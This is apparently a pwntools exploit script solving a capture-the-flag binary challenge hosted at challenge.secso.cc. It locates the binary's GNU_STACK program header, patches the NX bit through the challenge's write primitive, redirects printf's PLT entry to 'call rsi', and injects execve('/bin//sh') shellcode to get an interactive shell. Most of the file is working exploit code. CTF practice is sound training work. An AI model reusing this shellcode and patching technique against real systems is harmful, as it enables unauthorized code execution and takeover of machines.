
#!/usr/bin/env python3
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import *
from elftools.elf.elffile import ELFFile

# =========================================================
#                          SETUP                         
# =========================================================
exe = './binary_patched'
elf = context.binary = ELF(exe.split("_")[0], checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "challenge.secso.cc", 8002


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'debug'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if (not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB):
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
def find_nx():
    elf = ELFFile(open(exe.split("_")[0], 'rb'))

    # basic info
    print("[*] ELF class:", "ELF64" if elf.elfclass == 64 else "ELF32")
    print("[*] little endian:", elf.little_endian)
    print("[*] e_phoff =", hex(elf['e_phoff']), "e_phentsize =", elf['e_phentsize'])
    print()

    # enumerate program headers and print details
    print("Program headers (index: type, offset, filesz, flags):")
    ph_index = None
    for idx, seg in enumerate(elf.iter_segments()):
        p_type = seg.header['p_type']
        p_offset = seg.header['p_offset']
        p_filesz = seg.header['p_filesz']
        p_flags = seg.header.get('p_flags', 0)
        print(f"  [{idx}] {p_type}  offset={hex(p_offset)}  filesz={hex(p_filesz)}  flags=0x{p_flags:x}")
        # Try different ways to detect GNU_STACK:
        if (isinstance(p_type, str) and ('GNU_STACK' in p_type)) or (str(p_type).upper().find('GNU_STACK') != -1):
            ph_index = idx
            ph_seg = seg

    # If not found by string, try scanning section names / raw headers for GNU_STACK token
    if ph_index is None:
        # fallback: sometimes p_type is numeric; check the readelf-like text
        # We'll re-check by comparing the segment bytes to the string "GNU_STACK" in the program header area (best-effort)
        # (But usually the above is enough.)
        print("\n[-] PT_GNU_STACK not detected by pyelftools iteration.")
        print("    If readelf -l ./binary shows a GNU_STACK line, paste it here; otherwise this binary likely has no PT_GNU_STACK.")
        sys.exit(1)

    print(f"\n[*] Found PT_GNU_STACK at program header index {ph_index}.")
    # compute file offset of p_flags in program header table:
    e_phoff = elf['e_phoff']
    e_phentsize = elf['e_phentsize']
    if elf.elfclass == 64:
        p_flags_offset_in_ph = 4
    else:
        p_flags_offset_in_ph = 24
    file_offset = e_phoff + ph_index * e_phentsize + p_flags_offset_in_ph
    print("[*] p_flags start (file offset) =", hex(file_offset))

    # choose target byte depending on endianness
    if elf.little_endian:
        target_offset = file_offset      # low byte is first
    else:
        target_offset = file_offset + 3  # big-endian: low byte is last of 4
    return target_offset


def exploit():
    global io
    io = initialize()
    # debug()
    # merrow's solution
    if args.REMOTE:
        sla(": ", str(find_nx()).encode())
        sla("0x", b"7") # patch nx
        sla(": ", str(elf.plt['printf'] + 2).encode())
        sla("0x", b"e6") # call rsi
    shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    sla("?\n", shellcode)
    sleep(0.1)
    sl(b"ls")
    io.interactive()

if __name__ == '__main__':
    exploit()
